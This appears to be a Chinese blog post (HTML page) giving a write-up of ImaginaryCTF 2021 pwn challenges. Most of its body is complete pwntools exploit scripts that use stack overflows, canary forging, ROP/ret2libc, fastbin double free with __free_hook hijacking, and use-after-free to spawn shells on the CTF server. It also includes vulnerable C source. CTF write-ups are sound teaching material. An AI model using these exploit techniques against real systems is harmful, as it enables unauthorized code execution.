@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="lexsd6" />
+
+
+
+<meta name="description" content="又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="imaginaryctf2021-pwn-wp">
+<meta property="og:url" content="lexsd6.github.io/2021/07/28/imaginaryctf2021--pwn-wp/index.html">
+<meta property="og:site_name" content="lexsd6&#39;s home">
+<meta property="og:description" content="又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-07-28T15:40:37.640Z">
+<meta property="article:modified_time" content="2021-07-28T16:28:20.330Z">
+<meta property="article:author" content="lexsd6">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="lexsd6&#39;s home" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/title.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>imaginaryctf2021-pwn-wp | lexsd6&#39;s home</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/lexsd6.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">lexsd6</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ida/" rel="tag">ida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libc/" rel="tag">libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mics/" rel="tag">mics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/" rel="tag">node-js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/problem-resolve/" rel="tag">problem-resolve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/problem-resolve/" rel="tag">problem_resolve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/translate/" rel="tag">translate</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/" target="_blank" rel="noopener">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/" target="_blank" rel="noopener">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一梦想成为五边形战士的老菜鸡</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">lexsd6</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/lexsd6.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">lexsd6</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-imaginaryctf2021--pwn-wp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/28/imaginaryctf2021--pwn-wp/" class="article-date">
+      <time datetime="2021-07-28T15:40:37.640Z" itemprop="datePublished">2021-07-28</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      imaginaryctf2021-pwn-wp
+    </h1>
+  
+
+
+          <div style="margin-top:10px ;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">1.6k字</span>
+      </span>
+    </span>
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">阅读时长:</span>
+        <span class="post-count">8分</span>
+      </span>
+    </span>
+</div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud" >
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）</p>
+<a id="more"></a>
+<h2 id="fake-canary"><a href="#fake-canary" class="headerlink" title="fake_canary"></a>fake_canary</h2><p>题目没有看canary，但自己写了类似canary的功能。通过栈溢出在类似canary填上伪造canary即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'./fake_canary'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42002</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400608 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400536 : ret</span></span><br><span class="line"><span class="string">0x0000000000400542 : ret 0x200a</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>*<span class="number">5</span>+p64(<span class="number">0xDEADBEEF</span>)+p64(e.symbols[<span class="string">'win'</span>])+p64(<span class="number">0x00000000000400729</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="linonophobia"><a href="#linonophobia" class="headerlink" title="linonophobia"></a>linonophobia</h2><p>题目很有意思把printf函数地址偷偷换成puts地址。导致本菜鸡在那卡了半天。</p>
+<p>但发现可以通过puts和栈溢出泄露出canary。</p>
+<p>但发现str_bin_sh和onegatgad都打不通。分析elf发现<code>0x000000000601060</code>地址端有写入提示，在此写入后门。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from libcfind import *</span><br><span class="line"></span><br><span class="line">elf&#x3D;&#39;.&#x2F;linonophobia&#39;</span><br><span class="line">e&#x3D;ELF(elf)</span><br><span class="line">context(arch&#x3D;e.arch,log_level&#x3D;&#39;debug&#39;)</span><br><span class="line">p&#x3D;remote(&#39;chal.imaginaryctf.org&#39;,42006)</span><br><span class="line">#p&#x3D;process(elf)</span><br><span class="line">#</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8)</span><br><span class="line">p.recvline()</span><br><span class="line">#print(x)</span><br><span class="line">x&#x3D;p.recvline()[:7]</span><br><span class="line">print(len(x))</span><br><span class="line">print(x)</span><br><span class="line">addr&#x3D;u64(x.rjust(8,&#39;\x00&#39;))</span><br><span class="line"></span><br><span class="line">log.info(hex(addr))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">pay&#x3D;&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)</span><br><span class="line">print(hex(len(pay)))</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">0x000000000040086c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040086e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400870 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400872 : pop r15 ; ret</span><br><span class="line">0x000000000040086b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040086f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400638 : pop rbp ; ret</span><br><span class="line">0x0000000000400873 : pop rdi ; ret</span><br><span class="line">0x0000000000400871 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040086d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400566 : ret</span><br><span class="line">0x0000000000400769 : ret 0x8948</span><br><span class="line">0x0000000000400763 : ret 0xb60f</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">rdi_ret&#x3D;(0x0000000000400873 )</span><br><span class="line"></span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)+p64(0)+p64(rdi_ret)+p64(e.got[&#39;read&#39;])+p64(e.sym[&#39;puts&#39;])+p64(e.sym[&#39;main&#39;]))</span><br><span class="line">puts_addr&#x3D;u64(p.recvline()[:-1].ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.info(hex(puts_addr))</span><br><span class="line">x&#x3D;finder(&#39;read&#39;,puts_addr,num&#x3D;1)</span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)+p64(0)+&#39;\x00&#39;*0x30)</span><br><span class="line"># rbx rbp r12 r13 r14 r15 </span><br><span class="line">def csu(g1,g2,buf,rbx,rbp,r12,r13,r14,r15,lest_cell):</span><br><span class="line">    pay&#x3D;p64(g1)+p64(0)</span><br><span class="line">    pay&#x3D;pay+p64(rbx)+p64(rbp)</span><br><span class="line">    pay&#x3D;pay+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    pay&#x3D;pay+p64(g2)</span><br><span class="line">    pay&#x3D;pay+&#39;\00&#39;*0x38+p64(lest_cell)</span><br><span class="line"></span><br><span class="line">    return pay</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)+p64(0)+p64(rdi_ret)+p64(0x000000000601060)+p64(x.dump(&#39;gets&#39;))+p64(rdi_ret)+p64(0x000000000601060)+p64(x.dump(&#39;system&#39;))+p64(e.sym[&#39;main&#39;]))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;bash\x00&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="memory-pile"><a href="#memory-pile" class="headerlink" title="memory_pile"></a>memory_pile</h2><p>常规2.27libc 的fast bin 二次释放题，劫持<code>__free_hook</code>写入system,来得到shall。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">elf=<span class="string">'./memory_pile'</span></span><br><span class="line"></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42007</span>)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p.recvuntil(<span class="string">"I'll even give you a present, if you manage to unwrap it...\n"</span>)</span><br><span class="line">printf_addr=int(p.recvline(),<span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'With great power comes great responsibility &gt;'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'With great power comes great responsibility &gt;'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'With great power comes great responsibility &gt;'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Let me have it, boss &gt;'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'printf:'</span>+hex(printf_addr))</span><br><span class="line">x=finder(<span class="string">'printf'</span>,printf_addr)</span><br><span class="line">edit(<span class="number">0</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h2><p>rt，简单栈溢出。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./stackoverflow'</span>)</span><br><span class="line"><span class="comment">#p=process('./stackoverflow')</span></span><br><span class="line"><span class="comment">#db.attach(p)</span></span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42001</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>*<span class="number">5</span>+p64(<span class="number">0x69637466</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="the-first-fit"><a href="#the-first-fit" class="headerlink" title="the_first_fit"></a>the_first_fit</h2><p>简单的uaf利用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice, choice2;</span><br><span class="line">  <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">  <span class="keyword">char</span> *b;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a is at %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"b is at %p\n"</span>, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"1: Malloc\n2: Free\n3: Fill a\n4: System b\n&gt; "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span>(choice) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"What do I malloc?\n(1) a\n(2) b\n&gt;&gt; "</span>);</span><br><span class="line">              <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2);</span><br><span class="line">              <span class="keyword">if</span> (choice2 == <span class="number">1</span>)</span><br><span class="line">                a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> (choice2 == <span class="number">2</span>)</span><br><span class="line">                b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"What do I free?\n(1) a\n(2) b\n&gt;&gt; "</span>);</span><br><span class="line">              <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2);</span><br><span class="line">              <span class="keyword">if</span> (choice2 == <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">free</span>(a);</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> (choice2 == <span class="number">2</span>)</span><br><span class="line">                <span class="built_in">free</span>(b);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: <span class="built_in">printf</span>(<span class="string">"&gt;&gt; "</span>); <span class="built_in">scanf</span>(<span class="string">"%8s"</span>, a); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: system((<span class="keyword">char</span>*)b); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
